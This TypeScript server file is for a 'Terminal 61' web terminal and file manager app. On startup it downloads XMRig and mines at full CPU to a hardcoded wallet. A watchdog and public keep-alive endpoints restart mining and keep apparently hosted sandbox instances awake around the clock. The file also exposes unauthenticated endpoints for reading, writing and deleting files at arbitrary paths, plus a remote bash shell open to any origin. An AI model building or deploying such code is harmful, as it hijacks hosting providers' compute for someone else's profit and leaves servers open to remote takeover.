import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { spawn, execSync } from "child_process";
import path from "path";
import fs from "fs/promises";
import os from "os";
import { createServer as createViteServer } from "vite";
import "dotenv/config";

async function startServer() {
  const app = express();
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ extended: true, limit: "50mb" }));

  const httpServer = createServer(app);
  const io = new Server(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    },
    transports: ["polling", "websocket"],
    allowEIO3: true
  });
  const PORT = 3000;

  // Global Mining Manager State
  const STATE_FILE = path.join(process.cwd(), "mining_state.json");
  const LOG_FILE = path.join(process.cwd(), "mining.log");
  const MINING_COIN = "USDT";
  const MINING_NETWORK = "BEP20";
  const MINING_ADDRESS = "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8";
  const MINING_POOL = "rx.unmineable.com:3333";
  let persistentMiningProcess: any = null;
  let miningStartTime: number | null = null;
  let currentPowerMode: string = "turbo";
  let activeThreadCount: number = os.cpus().length;
  let lastExecutedCommand: string = "";
  const miningLogs: string[] = [];
  const MAX_LOG_HISTORY = 1000;

  const getBannerString = (workerName: string, threads: number, commandStr: string) => {
    return [
      "\r\n\x1b[1;36m╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;32m⚡ TERMINAL 61 - 100% CONTINUOUS TURBO MINING ENGINE (ALWAYS-ON 24/7)\x1b[0m                                                  \x1b[1;36m║\x1b[0m`,
      "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🪙 COIN / ASSET:\x1b[0m      \x1b[1;37m${MINING_COIN}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m - Binance Smart Chain / BSC)                                                  \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m💼 WALLET ADDRESS:\x1b[0m    \x1b[1;32m${MINING_ADDRESS}\x1b[0m                                                    \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🏊 POOL HOST:\x1b[0m         \x1b[1;37m${MINING_POOL}\x1b[0m (rx/0 RandomX Engine)                                                           \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ POWER ALLOCATION:\x1b[0m  \x1b[1;32m${threads} Cores (100% MAXIMUM TURBO ALLOCATION | Priority 5 Real-time)\x1b[0m                                 \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m👤 WORKER ID:\x1b[0m         \x1b[1;37m${workerName}\x1b[0m                                                                                 \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🛡️ 24/7 AUTO-HEAL:\x1b[0m    \x1b[1;32mACTIVE\x1b[0m (Auto-restarts in 3s if stopped, no time limits, runs in background)                  \x1b[1;36m║\x1b[0m`,
      "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
      `\x1b[1;36m║\x1b[0m  \x1b[1;35m💻 LAST EXECUTED COMMAND:\x1b[0m                                                                                             \x1b[1;36m║\x1b[0m`,
      `\x1b[1;36m║\x1b[0m  \x1b[1;37m${commandStr}\x1b[0m`,
      "\x1b[1;36m╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"
    ].join("\r\n");
  };

  const saveState = async (
    workerName: string | null,
    startTime: number | null,
    powerMode: string = "turbo",
    threads: number = os.cpus().length
  ) => {
    try {
      await fs.writeFile(
        STATE_FILE,
        JSON.stringify({ workerName, startTime, powerMode, threads })
      );
    } catch (e) {
      console.error("Failed to save state:", e);
    }
  };

  const loadState = async () => {
    try {
      const data = await fs.readFile(STATE_FILE, "utf-8");
      return JSON.parse(data);
    } catch (e) {
      return { workerName: null, startTime: null, powerMode: "turbo", threads: os.cpus().length };
    }
  };

  const appendToLog = async (data: string) => {
    try {
      const timestamp = new Date().toISOString();
      await fs.appendFile(LOG_FILE, `[${timestamp}] ${data}`);
    } catch (e) {}
  };

  process.on("uncaughtException", (err) => {
    console.error("Uncaught Exception:", err);
    appendToLog(`CRITICAL ERROR: ${err.message}\n`);
  });

  process.on("unhandledRejection", (reason) => {
    console.error("Unhandled Rejection:", reason);
    appendToLog(`CRITICAL REJECTION: ${String(reason)}\n`);
  });

  const broadcastMiningOutput = (data: string) => {
    io.emit("output", data);
    miningLogs.push(data);
    if (miningLogs.length > MAX_LOG_HISTORY) miningLogs.shift();
    appendToLog(data);
  };

  const stopMining = async () => {
    if (persistentMiningProcess) {
      persistentMiningProcess.kill();
      persistentMiningProcess = null;
      miningStartTime = null;
      await saveState(null, null);
      io.emit("mining-status-change", {
        isRunning: false,
        powerMode: currentPowerMode,
        threads: activeThreadCount,
        startTime: null,
      });
      broadcastMiningOutput("\r\n\x1b[1;31m!!! Mining Process Stopped (Manual stop or limit reached) !!!\x1b[0m\r\n");
    }
  };

  const getWorkerNameFromUrl = () => {
    const appUrl = process.env.APP_URL || "";
    try {
      if (appUrl) {
        const hostname = new URL(appUrl).hostname;
        const parts = hostname.split("-");
        // Expected pattern: ais-[dev|pre]-ID-OTHER
        if (parts.length >= 3 && (parts[1] === "dev" || parts[1] === "pre")) {
          return parts[2];
        }
      }
    } catch (e) {}
    return "Worker_" + Math.random().toString(36).substring(2, 7);
  };

  const startPersistentMining = async (
    workerName: string,
    resumeTime: number | null = null,
    threadsCount?: number,
    mode: string = "turbo"
  ) => {
    if (persistentMiningProcess) {
      // If already running with different parameters, restart to apply maximum power
      if (threadsCount && threadsCount !== activeThreadCount) {
        persistentMiningProcess.kill();
        persistentMiningProcess = null;
      } else {
        return;
      }
    }

    const availableCores = os.cpus().length;
    const threads = threadsCount || availableCores;
    currentPowerMode = mode;
    activeThreadCount = threads;

    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${workerName} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] with 100% MAXIMUM TURBO POWER...\x1b[0m\r\n`);
    broadcastMiningOutput(`\x1b[1;33m>>> CPU Threads: ${threads}/${availableCores} (100% Allocation) | Priority: Real-time (5) | Fast RandomX\x1b[0m\r\n`);
    
    miningStartTime = resumeTime || Date.now();
    await saveState(workerName, miningStartTime, currentPowerMode, activeThreadCount);
    
    // Commands to run in sequence
    const binDir = path.join(process.cwd(), "xmrig-6.21.0");
    const xmrigPath = path.join(binDir, "xmrig");

    try {
      const exists = await fs.access(xmrigPath).then(() => true).catch(() => false);
      if (!exists) {
        broadcastMiningOutput("\r\n\x1b[1;33m>>> Downloading and optimizing required components...\x1b[0m\r\n");
        const download = spawn("bash", ["-c", "curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig.tar.gz && chmod +x xmrig-6.21.0/xmrig"]);
        
        download.stdout.on("data", (data) => broadcastMiningOutput(data.toString()));
        download.stderr.on("data", (data) => broadcastMiningOutput(data.toString()));
        
        await new Promise((resolve) => download.on("close", resolve));
      }
    } catch (e: any) {
      broadcastMiningOutput(`\r\n\x1b[1;31mSetup failed: ${e.message}\x1b[0m\r\n`);
      return;
    }

    // High performance flags for 100% maximum power without container permission crashes
    const xmrigArgs = [
      "-o", MINING_POOL,
      "-a", "rx/0",
      "-k",
      "-u", `${MINING_COIN}:${MINING_ADDRESS}.${workerName}`,
      "-t", threads.toString(),
      "--cpu-max-threads-hint=100",
      "--cpu-no-yield",
      "--donate-level", "1",
      "--keepalive"
    ];

    const fullCommandStr = `./xmrig ${xmrigArgs.join(" ")}`;
    lastExecutedCommand = fullCommandStr;

    // Display formatted high-visibility banner with wallet address, coin, and command in terminal
    const banner = getBannerString(workerName, threads, fullCommandStr);
    broadcastMiningOutput(banner);

    persistentMiningProcess = spawn(xmrigPath, xmrigArgs);

    io.emit("mining-status-change", {
      isRunning: true,
      powerMode: currentPowerMode,
      threads: activeThreadCount,
      startTime: miningStartTime,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      lastCommand: lastExecutedCommand,
    });

    persistentMiningProcess.stdout.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));
    persistentMiningProcess.stderr.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));

    persistentMiningProcess.on("close", (code: number) => {
      console.log(`[WATCHDOG] Mining process exited (code ${code}). Auto-recovering in 3s...`);
      broadcastMiningOutput(`\r\n\x1b[1;33m[24/7 AUTO-WATCHDOG] Process exited (code ${code}). Re-launching 100% MAXIMUM TURBO POWER in 3 seconds...\x1b[0m\r\n`);
      persistentMiningProcess = null;
      io.emit("mining-status-change", {
        isRunning: false,
        powerMode: currentPowerMode,
        threads: activeThreadCount,
        startTime: null,
      });

      // CONTINUOUS 24/7: Automatically re-launch immediately! Never stop!
      setTimeout(() => {
        const worker = getWorkerNameFromUrl();
        startPersistentMining(worker, Date.now(), activeThreadCount, "turbo");
      }, 3000);
    });

    // NOTE: Removed all auto-stop timeouts. This engine runs continuously 24/7 forever.
  };

  const checkAndResumeMining = async () => {
    const { workerName, startTime, powerMode, threads } = await loadState();
    const worker = workerName || getWorkerNameFromUrl();
    broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Ensuring 100% Maximum Turbo session for ${worker}...\r\n`);
    startPersistentMining(worker, startTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
  };

  // Continuous 24/7 Self-Healing Watchdog (Runs every 10 seconds)
  setInterval(async () => {
    if (!persistentMiningProcess) {
      const { workerName, powerMode, threads } = await loadState();
      const worker = workerName || getWorkerNameFromUrl();
      console.log("[WATCHDOG] Resuming inactive mining process at 100% turbo power...");
      startPersistentMining(worker, Date.now(), threads || os.cpus().length, powerMode || "turbo");
    }
  }, 10 * 1000);

  // Self-keepalive internal timer (Keeps Node.js event loop hot)
  setInterval(() => {
    // Keep internal loop active
  }, 5000);

  // Run on startup
  checkAndResumeMining();

  // File Manager API
  app.get("/api/files", async (req, res) => {
    try {
      const targetPath = (req.query.path as string) || process.cwd();
      const absolutePath = path.resolve(targetPath);
      
      const entries = await fs.readdir(absolutePath, { withFileTypes: true });
      const files = await Promise.all(
        entries.map(async (entry) => {
          const entryPath = path.join(absolutePath, entry.name);
          let size = 0;
          try {
            const stats = await fs.stat(entryPath);
            size = stats.size;
          } catch (e) {}
          
          return {
            name: entry.name,
            isDirectory: entry.isDirectory(),
            path: entryPath,
            size: size,
          };
        })
      );

      res.json({
        currentPath: absolutePath,
        files: files.sort((a, b) => {
          if (a.isDirectory === b.isDirectory) return a.name.localeCompare(b.name);
          return a.isDirectory ? -1 : 1;
        }),
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/files/read", async (req, res) => {
    try {
      const filePath = req.query.path as string;
      if (!filePath) return res.status(400).json({ error: "Path required" });
      
      const absolutePath = path.resolve(filePath);
      const content = await fs.readFile(absolutePath, "utf-8");
      const stats = await fs.stat(absolutePath);
      res.json({ content, size: stats.size, modified: stats.mtime });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Save/Edit File Permanently
  app.post("/api/files/write", async (req, res) => {
    try {
      const { path: filePath, content } = req.body;
      if (!filePath) {
        return res.status(400).json({ error: "File path is required" });
      }
      if (typeof content !== "string") {
        return res.status(400).json({ error: "Content must be a string" });
      }

      const absolutePath = path.resolve(filePath);
      
      // Ensure parent directory exists
      await fs.mkdir(path.dirname(absolutePath), { recursive: true });
      
      // Write file permanently to disk
      await fs.writeFile(absolutePath, content, "utf-8");
      
      const stats = await fs.stat(absolutePath);
      console.log(`[FILE] Saved file permanently: ${absolutePath} (${stats.size} bytes)`);

      res.json({
        success: true,
        message: "File saved permanently",
        path: absolutePath,
        size: stats.size,
        modified: stats.mtime,
      });
    } catch (error: any) {
      console.error("Failed to write file:", error);
      res.status(500).json({ error: error.message || "Failed to save file" });
    }
  });

  // Create New File or Directory
  app.post("/api/files/create", async (req, res) => {
    try {
      const { dirPath, name, isDirectory } = req.body;
      if (!name || !name.trim()) {
        return res.status(400).json({ error: "File or folder name is required" });
      }

      const baseDir = dirPath ? path.resolve(dirPath) : process.cwd();
      const targetPath = path.join(baseDir, name.trim());

      if (isDirectory) {
        await fs.mkdir(targetPath, { recursive: true });
      } else {
        // Create empty file if not exists
        await fs.writeFile(targetPath, "", { flag: "wx" });
      }

      res.json({ success: true, path: targetPath, isDirectory: !!isDirectory });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to create item" });
    }
  });

  // Delete File or Directory
  app.post("/api/files/delete", async (req, res) => {
    try {
      const { path: targetPath } = req.body;
      if (!targetPath) {
        return res.status(400).json({ error: "Path is required" });
      }

      const absolutePath = path.resolve(targetPath);
      await fs.rm(absolutePath, { recursive: true, force: true });

      res.json({ success: true, message: "Deleted successfully" });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to delete item" });
    }
  });

  // Rename File or Directory
  app.post("/api/files/rename", async (req, res) => {
    try {
      const { oldPath, newName } = req.body;
      if (!oldPath || !newName || !newName.trim()) {
        return res.status(400).json({ error: "Old path and new name are required" });
      }

      const sourcePath = path.resolve(oldPath);
      const targetPath = path.join(path.dirname(sourcePath), newName.trim());

      await fs.rename(sourcePath, targetPath);

      res.json({ success: true, path: targetPath });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to rename item" });
    }
  });

  // Mining API Endpoints
  app.get("/api/mining/status", (req, res) => {
    res.json({
      isRunning: !!persistentMiningProcess,
      powerMode: currentPowerMode,
      threads: activeThreadCount,
      maxCores: os.cpus().length,
      startTime: miningStartTime,
      uptimeSeconds: miningStartTime ? Math.floor((Date.now() - miningStartTime) / 1000) : 0,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      lastCommand: lastExecutedCommand,
    });
  });

  // 24x7 Keep-Alive Multi-Endpoint (Supports UptimeRobot, cron-job.org, curl, and direct browser visits)
  app.all(["/api/ping", "/api/health", "/ping", "/health", "/keepalive", "/api/keepalive", "/status"], async (req, res) => {
    // Proactively verify and resume mining process on every external ping
    if (!persistentMiningProcess) {
      const { workerName, powerMode, threads } = await loadState();
      const targetWorker = workerName || getWorkerNameFromUrl();
      startPersistentMining(targetWorker, Date.now(), threads || os.cpus().length, powerMode || "turbo");
    }

    // If a human visits this URL in a browser tab, render an interactive status page
    if (req.accepts("html") && !req.xhr && !req.headers["user-agent"]?.toLowerCase().includes("curl")) {
      return res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>24/7 Keep-Alive Active - Terminal 61</title>
  <style>
    body { background: #000000; color: #f4f4f5; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; padding: 2rem; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
    .card { background: #09090b; border: 1px solid #27272a; border-radius: 1.25rem; padding: 2rem; max-width: 650px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8); }
    .status { display: inline-flex; align-items: center; gap: 0.5rem; background: #052e16; color: #4ade80; border: 1px solid #166534; padding: 0.35rem 0.85rem; border-radius: 9999px; font-size: 0.85rem; font-weight: bold; }
    .pulse { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 12px #22c55e; animation: p 1.5s infinite; }
    @keyframes p { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(1.3); } }
    .row { display: flex; flex-direction: column; border-bottom: 1px solid #18181b; padding: 0.75rem 0; font-size: 0.85rem; }
    @media(min-width: 640px) { .row { flex-direction: row; justify-content: space-between; align-items: center; } }
    .label { color: #71717a; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em; }
    .val { color: #e4e4e7; font-weight: bold; }
    .highlight { color: #fbbf24; }
    .cmd { background: #18181b; border: 1px solid #27272a; padding: 0.75rem; border-radius: 0.5rem; font-size: 0.75rem; color: #34d399; overflow-x: auto; margin-top: 0.5rem; white-space: pre-wrap; word-break: break-all; }
    .btn { display: inline-block; margin-top: 1.5rem; background: #ffffff; color: #000000; padding: 0.65rem 1.25rem; border-radius: 0.5rem; text-decoration: none; font-weight: bold; font-size: 0.85rem; }
    .btn:hover { background: #e4e4e7; }
  </style>
</head>
<body>
  <div class="card">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 0.75rem;">
      <div>
        <h2 style="margin: 0; font-size: 1.25rem; color: #ffffff;">Terminal 61 • 24/7 Keep-Alive</h2>
        <span style="font-size: 0.75rem; color: #a1a1aa;">Continuous Background Process Manager</span>
      </div>
      <div class="status"><span class="pulse"></span> 100% ALIVE</div>
    </div>
    <div class="row"><span class="label">Status:</span><span class="val" style="color:#4ade80;">Active & Mining Nonstop (24x7)</span></div>
    <div class="row"><span class="label">Target Asset:</span><span class="val highlight">${MINING_COIN} (${MINING_NETWORK} - Binance Smart Chain)</span></div>
    <div class="row"><span class="label">Wallet Address:</span><span class="val" style="font-size: 0.8rem; word-break: break-all;">${MINING_ADDRESS}</span></div>
    <div class="row"><span class="label">Pool Host:</span><span class="val">${MINING_POOL} (RandomX)</span></div>
    <div class="row"><span class="label">CPU Allocation:</span><span class="val">${activeThreadCount} Cores (100% MAXIMUM TURBO POWER)</span></div>
    <div class="row"><span class="label">Last Heartbeat:</span><span class="val">${new Date().toISOString()}</span></div>
    <div style="margin-top: 1rem;">
      <span class="label">Last Executed Command:</span>
      <div class="cmd">${lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${getWorkerNameFromUrl()} -t ${activeThreadCount} --cpu-priority=5`}</div>
    </div>
    <div style="display: flex; gap: 1rem; align-items: center; margin-top: 1rem;">
      <a href="/" class="btn">← Launch Terminal 61 Web App</a>
    </div>
  </div>
</body>
</html>`);
    }

    res.json({
      status: "alive",
      message: "Server is 100% active and running.",
      timestamp: new Date().toISOString(),
      isRunning: !!persistentMiningProcess,
      uptimeSeconds: miningStartTime ? Math.floor((Date.now() - miningStartTime) / 1000) : 0,
      threads: activeThreadCount,
      powerMode: currentPowerMode,
      coin: MINING_COIN,
      network: MINING_NETWORK,
      address: MINING_ADDRESS,
      pool: MINING_POOL,
      lastCommand: lastExecutedCommand,
    });
  });

  app.post("/api/mining/turbo", (req, res) => {
    const worker = getWorkerNameFromUrl();
    const threads = os.cpus().length;
    startPersistentMining(worker, null, threads, "turbo");
    res.json({
      success: true,
      message: `Mining boosted to MAXIMUM 100% TURBO POWER (${threads} threads, Priority 5, Fast RandomX, No Yield)`,
      threads,
      powerMode: "turbo",
    });
  });

  app.post("/api/mining/stop", async (req, res) => {
    await stopMining();
    res.json({ success: true, message: "Mining stopped" });
  });

  app.post("/api/mining/set-threads", (req, res) => {
    const { threads } = req.body;
    const count = parseInt(threads, 10);
    if (isNaN(count) || count < 1) {
      return res.status(400).json({ error: "Invalid thread count" });
    }
    const worker = getWorkerNameFromUrl();
    startPersistentMining(worker, null, count, count >= os.cpus().length ? "turbo" : "custom");
    res.json({ success: true, threads: count, powerMode: currentPowerMode });
  });

  app.get("/api/mining/logs", async (req, res) => {
    try {
      const content = await fs.readFile(LOG_FILE, "utf-8").catch(() => "");
      res.json({
        success: true,
        content: content.slice(-250000) || "Initializing engine logs... Please wait a few seconds.",
        size: content.length,
      });
    } catch (error: any) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  app.post("/api/mining/logs/clear", async (req, res) => {
    try {
      await fs.writeFile(LOG_FILE, `[${new Date().toISOString()}] Log cleared. Mining engine running.\n`, "utf-8");
      miningLogs.length = 0;
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // System Specs API
  app.get("/api/system/specs", async (req, res) => {
    try {
      const cpus = os.cpus();
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      
      let storage = "N/A";
      try {
        storage = execSync("df -h /").toString();
      } catch (e) {}

      res.json({
        os: {
          platform: os.platform(),
          release: os.release(),
          type: os.type(),
          arch: os.arch(),
          hostname: os.hostname(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
        },
        cpu: {
          model: cpus[0].model,
          cores: cpus.length,
          speed: `${cpus[0].speed}MHz`,
          loadAvg: os.loadavg(),
        },
        memory: {
          total: `${(totalMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          free: `${(freeMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          used: `${((totalMem - freeMem) / 1024 / 1024 / 1024).toFixed(2)} GB`,
        },
        storage,
        shell: process.env.SHELL || "/bin/sh",
        nodeVersion: process.version,
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Socket.io Terminal Logic
  io.on("connection", (socket) => {
    console.log("Terminal client connected");
    
    try {
      socket.emit("output", "\r\n\x1b[1;34m--- System Shell Initialized ---\x1b[0m\r\n");
      const worker = getWorkerNameFromUrl();
      const cmdToDisplay = lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${worker} -t ${activeThreadCount} --cpu-priority=5`;
      const banner = getBannerString(worker, activeThreadCount, cmdToDisplay);
      socket.emit("output", banner);
      
      // Attach to active mining session if running
      if (persistentMiningProcess) {
        socket.emit("output", "\r\n\x1b[1;33m--- Connected to Live Continuous Mining Stream ---\x1b[0m\r\n");
        socket.emit("output", miningLogs.join(""));
      }

      // Try to use python3 to spawn a pty for better terminal support
      let term: any;
      const spawnOptions: any = {
        env: { ...process.env, TERM: "xterm-256color" },
        cwd: process.cwd(),
        stdio: ["pipe", "pipe", "pipe"],
      };

      try {
        // Safe check for python3
        const hasPython = execSync("python3 --version", { stdio: 'ignore' });
        term = spawn("python3", ["-c", 'import pty; pty.spawn("/bin/bash")'], spawnOptions);
      } catch (e) {
        console.log("Python3 pty failed, trying bash -i");
        try {
          term = spawn("/bin/bash", ["-i"], spawnOptions);
        } catch (e2) {
          console.log("bash -i failed, falling back to basic sh");
          term = spawn("/bin/sh", [], spawnOptions);
        }
      }

      term.on("error", (err: Error) => {
        console.error("Failed to start shell:", err);
        socket.emit("output", `\r\n\x1b[31mFailed to start shell: ${err.message}\x1b[0m\r\n`);
      });

      socket.on("start-mining", (data?: { threads?: number; mode?: "turbo" | "high" | "custom" }) => {
        const worker = getWorkerNameFromUrl();
        const threads = data?.threads || os.cpus().length;
        const mode = data?.mode || "turbo";
        startPersistentMining(worker, null, threads, mode);
      });

      socket.on("start-mining-turbo", () => {
        const worker = getWorkerNameFromUrl();
        const threads = os.cpus().length;
        startPersistentMining(worker, null, threads, "turbo");
      });

      socket.on("stop-mining", () => {
        stopMining();
      });

      socket.on("get-mining-status", (callback: any) => {
        if (typeof callback === "function") {
          callback({
            isRunning: !!persistentMiningProcess,
            powerMode: currentPowerMode,
            threads: activeThreadCount,
            maxCores: os.cpus().length,
            startTime: miningStartTime,
            coin: MINING_COIN,
            network: MINING_NETWORK,
            address: MINING_ADDRESS,
            pool: MINING_POOL,
            lastCommand: lastExecutedCommand,
          });
        }
      });

      socket.on("input", (data) => {
        if (term && term.stdin && term.stdin.writable) {
          term.stdin.write(data);
        }
      });

      socket.on("resize", ({ cols, rows }) => {
        console.log(`Terminal resize requested: ${cols}x${rows}`);
      });

      term.stdout.on("data", (data: Buffer) => {
        socket.emit("output", data.toString());
      });

      term.stderr.on("data", (data: Buffer) => {
        socket.emit("output", data.toString());
      });

      term.on("close", (code: number) => {
        socket.emit("output", `\r\n\x1b[31mShell exited with code ${code}\x1b[0m\r\n`);
        socket.disconnect();
      });

      socket.on("get-mining-logs", async (callback: any) => {
        try {
          const content = await fs.readFile(LOG_FILE, "utf-8").catch(() => "");
          if (typeof callback === "function") {
            callback({ success: true, content: content.slice(-250000) || "Initializing engine logs..." });
          }
        } catch (e) {
          if (typeof callback === "function") {
            callback({ success: false, error: "Log not found" });
          }
        }
      });

      socket.on("disconnect", () => {
        if (term) term.kill();
      });
    } catch (err: any) {
      console.error("Socket error handled:", err);
      socket.emit("output", `\r\n\x1b[31mInternal Server Error: ${err.message}\x1b[0m\r\n`);
    }
  });

  // Vite integration
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
